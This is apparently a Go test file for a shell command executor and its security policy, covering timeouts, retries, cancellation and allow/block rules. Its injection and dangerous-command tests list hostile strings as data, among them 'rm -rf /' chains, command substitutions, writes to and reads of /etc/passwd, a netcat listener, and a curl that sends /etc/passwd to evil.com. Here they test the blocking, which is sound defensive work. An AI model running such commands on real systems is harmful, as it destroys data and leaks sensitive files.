package execution

import (
	"context"
	"runtime"
	"strings"
	"testing"
	"time"
)

// newPermissiveExecutor creates an executor with a permissive policy for testing
// Use this when testing executor functionality, not security policy
func newPermissiveExecutor() *Executor {
	// Create a policy with no restrictions for testing executor functionality
	policy := &CommandPolicy{
		Mode:                ExecutionModePermissive,
		AllowedCommands:     make(map[string]bool),
		AllowedPatterns:     nil,
		BlockedCommands:     make(map[string]bool), // No blocked commands
		BlockedPatterns:     nil,                   // No blocked patterns
		AllowShellExecution: true,
		MaxCommandLength:    0, // No limit
		AllowedEnvVars:      make(map[string]bool),
	}
	return NewExecutor(&ExecutorOptions{Policy: policy})
}

func TestNewExecutor(t *testing.T) {
	// Test with default options
	e := NewExecutor(nil)
	if e == nil {
		t.Fatal("NewExecutor returned nil")
	}
	if e.killTimeout != 5*time.Second {
		t.Errorf("Default killTimeout = %v, want 5s", e.killTimeout)
	}

	// Test with custom options
	e = NewExecutor(&ExecutorOptions{
		KillTimeout: 10 * time.Second,
	})
	if e.killTimeout != 10*time.Second {
		t.Errorf("Custom killTimeout = %v, want 10s", e.killTimeout)
	}
}

func TestExecutor_Execute_Simple(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	var capturedOutput []string
	outputHandler := func(cmdID string, isStderr bool, data []byte) {
		if !isStderr {
			capturedOutput = append(capturedOutput, string(data))
		}
	}

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-1",
		Command:   "echo 'Hello World'",
		Shell:     &BashShell{},
	}, outputHandler)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	if result.ExitCode != 0 {
		t.Errorf("ExitCode = %d, want 0", result.ExitCode)
	}

	output := string(result.Stdout)
	if !strings.Contains(output, "Hello World") {
		t.Errorf("Output doesn't contain 'Hello World': %s", output)
	}

	if result.Attempts != 1 {
		t.Errorf("Attempts = %d, want 1", result.Attempts)
	}

	if len(capturedOutput) == 0 {
		t.Error("Output handler was not called")
	}
}

func TestExecutor_Execute_WithShellType(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-2",
		Command:   "echo 'test'",
		ShellType: ShellTypeSh,
	}, nil)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	if result.ExitCode != 0 {
		t.Errorf("ExitCode = %d, want 0", result.ExitCode)
	}
}

func TestExecutor_Execute_DirectExecution(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-3",
		Command:   "echo",
		Args:      []string{"direct execution"},
		// No shell specified - direct execution
	}, nil)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	if result.ExitCode != 0 {
		t.Errorf("ExitCode = %d, want 0", result.ExitCode)
	}

	output := string(result.Stdout)
	if !strings.Contains(output, "direct execution") {
		t.Errorf("Output doesn't contain expected text: %s", output)
	}
}

func TestExecutor_Execute_WithEnv(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-4",
		Command:   "echo $TEST_VAR",
		Shell:     &BashShell{},
		Env: map[string]string{
			"TEST_VAR": "test-value",
		},
	}, nil)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	output := strings.TrimSpace(string(result.Stdout))
	if output != "test-value" {
		t.Errorf("Output = %q, want 'test-value'", output)
	}
}

func TestExecutor_Execute_WithTimeout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-5",
		Command:   "sleep 10",
		Shell:     &BashShell{},
		Timeout:   100 * time.Millisecond,
	}, nil)

	// Should timeout
	if err == nil {
		t.Error("Expected timeout error")
	}

	if result.ExitCode == 0 {
		t.Error("Expected non-zero exit code on timeout")
	}
}

func TestExecutor_Execute_WithRetries(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	attemptCount := 0
	outputHandler := func(cmdID string, isStderr bool, data []byte) {
		// Count attempts by tracking error messages
		if isStderr && strings.Contains(string(data), "attempt") {
			attemptCount++
		}
	}

	// Command that always fails
	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID:  "test-6",
		Command:    "exit 1",
		Shell:      &BashShell{},
		Retries:    2, // 1 initial + 2 retries = 3 attempts
		RetryDelay: 10 * time.Millisecond,
	}, outputHandler)

	if err == nil {
		t.Error("Expected error from failing command")
	}

	if result.Attempts != 3 {
		t.Errorf("Attempts = %d, want 3", result.Attempts)
	}

	if result.ExitCode != 1 {
		t.Errorf("ExitCode = %d, want 1", result.ExitCode)
	}
}

func TestExecutor_Execute_RetriesSuccessOnSecondAttempt(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := newPermissiveExecutor() // Use permissive policy for shell script testing
	ctx := context.Background()

	// Use a file to track attempts (bash-based workaround)
	// First attempt fails, second succeeds
	script := `
if [ ! -f /tmp/test-exec-attempt ]; then
  touch /tmp/test-exec-attempt
  exit 1
else
  rm /tmp/test-exec-attempt
  exit 0
fi
`

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID:  "test-7",
		Command:    script,
		Shell:      &BashShell{},
		Retries:    2,
		RetryDelay: 10 * time.Millisecond,
	}, nil)

	if err != nil {
		t.Errorf("Execute failed: %v", err)
	}

	if result.ExitCode != 0 {
		t.Errorf("ExitCode = %d, want 0 (should succeed on retry)", result.ExitCode)
	}

	if result.Attempts != 2 {
		t.Errorf("Attempts = %d, want 2", result.Attempts)
	}
}

func TestExecutor_Execute_WithWorkingDir(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID:  "test-8",
		Command:    "pwd",
		Shell:      &BashShell{},
		WorkingDir: "/tmp",
	}, nil)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	output := strings.TrimSpace(string(result.Stdout))
	if output != "/tmp" && output != "/private/tmp" { // macOS may use /private/tmp
		t.Errorf("Working directory = %q, want /tmp or /private/tmp", output)
	}
}

func TestExecutor_Execute_CapturesStderr(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := newPermissiveExecutor() // Use permissive policy for redirect testing
	ctx := context.Background()

	var stderrCaptured bool
	outputHandler := func(cmdID string, isStderr bool, data []byte) {
		if isStderr {
			stderrCaptured = true
		}
	}

	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "test-9",
		Command:   "echo 'error message' >&2",
		Shell:     &BashShell{},
	}, outputHandler)

	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}

	stderrOutput := string(result.Stderr)
	if !strings.Contains(stderrOutput, "error message") {
		t.Errorf("Stderr doesn't contain 'error message': %s", stderrOutput)
	}

	if !stderrCaptured {
		t.Error("Output handler didn't receive stderr")
	}
}

func TestExecutor_GetRunningCommands(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx := context.Background()

	// Start a long-running command
	go func() {
		_, _ = e.Execute(ctx, &ExecuteRequest{
			CommandID: "long-running",
			Command:   "sleep 2",
			Shell:     &BashShell{},
		}, nil)
	}()

	// Give it time to start
	time.Sleep(100 * time.Millisecond)

	running := e.GetRunningCommands()
	found := false
	for _, id := range running {
		if id == "long-running" {
			found = true
			break
		}
	}

	if !found {
		t.Error("Long-running command not found in running commands")
	}
}

func TestExecutor_CancelCommand(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(&ExecutorOptions{
		KillTimeout: 100 * time.Millisecond,
	})
	ctx := context.Background()

	// Start a long-running command
	done := make(chan struct{})
	var execErr error
	go func() {
		_, execErr = e.Execute(ctx, &ExecuteRequest{
			CommandID: "cancel-test",
			Command:   "sleep 10",
			Shell:     &BashShell{},
		}, nil)
		close(done)
	}()

	// Give it time to start
	time.Sleep(100 * time.Millisecond)

	// Cancel the command
	err := e.CancelCommand("cancel-test")
	if err != nil {
		t.Errorf("CancelCommand failed: %v", err)
	}

	// Wait for command to complete
	select {
	case <-done:
		// Command should have been cancelled
		if execErr == nil {
			t.Error("Expected error from cancelled command")
		}
	case <-time.After(2 * time.Second):
		t.Error("Command didn't terminate after cancel")
	}
}

func TestExecutor_CancelCommand_NotFound(t *testing.T) {
	e := NewExecutor(nil)

	err := e.CancelCommand("nonexistent")
	if err == nil {
		t.Error("Expected error when cancelling non-existent command")
	}
}

func TestExecutor_Execute_ContextCancellation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil)
	ctx, cancel := context.WithCancel(context.Background())

	// Start a long-running command
	done := make(chan struct{})
	var result *CommandResult
	var execErr error
	go func() {
		result, execErr = e.Execute(ctx, &ExecuteRequest{
			CommandID: "ctx-cancel-test",
			Command:   "sleep 10",
			Shell:     &BashShell{},
		}, nil)
		close(done)
	}()

	// Give it time to start
	time.Sleep(100 * time.Millisecond)

	// Cancel context
	cancel()

	// Wait for command to complete
	select {
	case <-done:
		if execErr == nil {
			t.Error("Expected error from context cancellation")
		}
		if result.ExitCode == 0 {
			t.Error("Expected non-zero exit code")
		}
	case <-time.After(2 * time.Second):
		t.Error("Command didn't terminate after context cancellation")
	}
}

// Tests for command injection prevention

func TestExecutor_BlocksShellInjection(t *testing.T) {
	e := NewExecutor(nil) // Uses default policy
	ctx := context.Background()

	injectionAttempts := []struct {
		name    string
		command string
		desc    string
	}{
		{"semicolon_injection", "ls; rm -rf /", "command chaining with semicolon"},
		{"ampersand_injection", "ls & rm -rf /", "background command injection"},
		{"pipe_injection", "echo hello | sh", "pipe to shell interpreter"},
		{"backtick_injection", "echo `rm -rf /`", "backtick command substitution"},
		{"dollar_paren_injection", "echo $(rm -rf /)", "dollar-paren command substitution"},
		{"redirect_to_system", "echo pwned > /etc/passwd", "redirect to system file"},
		{"path_traversal", "cat ../../etc/passwd", "path traversal attack"},
	}

	for _, tt := range injectionAttempts {
		t.Run(tt.name, func(t *testing.T) {
			result, err := e.Execute(ctx, &ExecuteRequest{
				CommandID: "injection-test",
				Command:   tt.command,
				ShellType: ShellTypeBash,
			}, nil)

			if err == nil {
				t.Errorf("Expected error for %s, got nil", tt.desc)
			}
			if result.ExitCode != -1 {
				t.Errorf("Expected exit code -1 for rejected command, got %d", result.ExitCode)
			}
			if !strings.Contains(err.Error(), "security policy") {
				t.Errorf("Expected security policy error, got: %v", err)
			}
		})
	}
}

func TestExecutor_BlocksDangerousCommands(t *testing.T) {
	e := NewExecutor(nil) // Uses default policy
	ctx := context.Background()

	dangerousCommands := []struct {
		name    string
		command string
	}{
		{"rm", "rm -rf /tmp/test"},
		{"sudo", "sudo ls"},
		{"bash", "bash -c 'echo hello'"},
		{"python", "python -c 'print(1)'"},
		{"nc", "nc -l 1234"},
		{"curl_exfiltrate", "curl http://evil.com -d @/etc/passwd"},
	}

	for _, tt := range dangerousCommands {
		t.Run(tt.name, func(t *testing.T) {
			result, err := e.Execute(ctx, &ExecuteRequest{
				CommandID: "dangerous-cmd-test",
				Command:   tt.command,
				ShellType: ShellTypeBash,
			}, nil)

			if err == nil {
				t.Errorf("Expected error for dangerous command %q, got nil", tt.command)
			}
			if result.ExitCode != -1 {
				t.Errorf("Expected exit code -1 for rejected command, got %d", result.ExitCode)
			}
		})
	}
}

func TestExecutor_AllowsSafeCommands(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping on Windows")
	}

	e := NewExecutor(nil) // Uses default policy
	ctx := context.Background()

	safeCommands := []struct {
		name    string
		command string
	}{
		{"echo", "echo hello"},
		{"ls", "ls"},
		{"date", "date"},
		{"hostname", "hostname"},
		{"uname", "uname -a"},
		{"whoami", "whoami"},
	}

	for _, tt := range safeCommands {
		t.Run(tt.name, func(t *testing.T) {
			result, err := e.Execute(ctx, &ExecuteRequest{
				CommandID: "safe-cmd-test",
				Command:   tt.command,
				ShellType: ShellTypeBash,
			}, nil)

			if err != nil {
				t.Errorf("Safe command %q was rejected: %v", tt.command, err)
			}
			if result.ExitCode != 0 {
				t.Errorf("Safe command %q had non-zero exit code: %d", tt.command, result.ExitCode)
			}
		})
	}
}

func TestExecutor_StrictPolicyBlocksUnknownCommands(t *testing.T) {
	strictPolicy := StrictPolicy([]string{"ls", "echo"})
	e := NewExecutor(&ExecutorOptions{Policy: strictPolicy})
	ctx := context.Background()

	// Allowed command should work (using direct execution)
	result, err := e.Execute(ctx, &ExecuteRequest{
		CommandID: "strict-allowed",
		Command:   "echo",
		Args:      []string{"hello"},
	}, nil)

	if err != nil {
		t.Errorf("Allowed command was rejected: %v", err)
	}
	if result.ExitCode != 0 {
		t.Errorf("Allowed command failed with exit code: %d", result.ExitCode)
	}

	// Unknown command should be blocked
	result, err = e.Execute(ctx, &ExecuteRequest{
		CommandID: "strict-blocked",
		Command:   "date", // Not in allowlist
	}, nil)

	if err == nil {
		t.Error("Unknown command should be blocked in strict mode")
	}
	if !strings.Contains(err.Error(), "not in allowlist") {
		t.Errorf("Expected 'not in allowlist' error, got: %v", err)
	}
}

func TestExecutor_PolicyGetterSetter(t *testing.T) {
	e := NewExecutor(nil)

	// Default policy should be normal mode
	policy := e.GetPolicy()
	if policy.Mode != ExecutionModeNormal {
		t.Errorf("Default policy mode = %v, want normal", policy.Mode)
	}

	// Set a strict policy
	strictPolicy := StrictPolicy([]string{"ls"})
	e.SetPolicy(strictPolicy)

	policy = e.GetPolicy()
	if policy.Mode != ExecutionModeStrict {
		t.Errorf("After SetPolicy mode = %v, want strict", policy.Mode)
	}
}
